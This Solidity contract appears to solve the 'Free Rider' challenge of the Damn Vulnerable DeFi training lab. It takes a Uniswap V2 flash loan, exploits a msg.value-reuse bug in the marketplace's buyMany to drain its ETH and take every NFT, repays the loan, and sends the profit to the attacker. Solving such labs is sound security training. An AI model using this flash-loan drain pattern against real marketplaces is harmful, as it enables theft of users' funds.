// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';

import "../DamnValuableNFT.sol";

interface IFreeRiderNFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function token() external returns (IERC721);
}

interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}


// step1: uniswapV2 闪电贷拿到足够WETH（>90ETH）并通过withdraw换成ETH

// step2: buyOne中存在Bug:
// 1. msg.value的值会被复用导致marketplace会用合约的钱支付
// 2. msg.value会被发给buyer而非seller

// step3: 循环transfer给rider，拿到45ETH

// step4: 归还闪电贷
contract Attack4 is IUniswapV2Callee, IERC721Receiver {
    address weth;
    address pair;
    address buyer;
    address marketplace;
    address nft;
    address attacker;

    constructor(
        address _weth,
        address _pair,
        address _buyer,
        address _marketplace,
        address _nft
    ) {
        weth = _weth;
        pair = _pair;
        buyer = _buyer;
        marketplace = _marketplace;
        nft = _nft;
        attacker = msg.sender;
    }

    receive() external payable{}

    /// @param _tokenBorrow: WETH address
    /// @param _amount: WETH amount to be borrowed 
    function hack(address _tokenBorrow, uint256 _amount) public {
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint amount1Out = _tokenBorrow == token1 ? _amount : 0;
        bytes memory data = abi.encode(_tokenBorrow, _amount);

        IUniswapV2Pair(pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            data
        );
    }  
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        (address tokenBorrowed, uint256 amountBorrowed) = abi.decode(data, (address, uint256));
        require(tokenBorrowed == weth, "invalid borrowed token");

        // weth ==> eth: balance 120
        IWETH(weth).withdraw(amountBorrowed);
        
        // 15 ether per NFT : balance 120 -30 +30
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        IFreeRiderNFTMarketplace(marketplace).buyMany{value: 30 ether}(tokenIds);

        // offer
        DamnValuableNFT(nft).setApprovalForAll(address(marketplace), true);
        uint256[] memory prices = new uint256[](2);
        prices[0] = 90 ether;
        prices[1] = 90 ether;
        IFreeRiderNFTMarketplace(marketplace).offerMany(tokenIds, prices);
        // drain the marketplace balance: 120 - 90 + 180
        IFreeRiderNFTMarketplace(marketplace).buyMany{value: 90 ether}(tokenIds);

        tokenIds = new uint256[](4);
        tokenIds[0] = 2;
        tokenIds[1] = 3;
        tokenIds[2] = 4;
        tokenIds[3] = 5;
        // balance: 120 - 90 + 180 - 60 + 60 + 45
        IFreeRiderNFTMarketplace(marketplace).buyMany{value: 60 ether}(tokenIds);
        for (uint8 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }
        
        // return WETH to V2 pair
        /// @notice have been taken fee 3/1000
        uint256 fee = amountBorrowed * 3 / 997 + 1;
        uint256 amountRepayed = amountBorrowed + fee;
        IWETH(weth).deposit{value: amountRepayed}();
        assert(IWETH(weth).transfer(msg.sender, amountRepayed));

        // get the rest back
        (bool success, ) = payable(attacker).call{value: address(this).balance}("");
        if (!success) {
            revert("transfer to hacker failed!");
        }
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }

}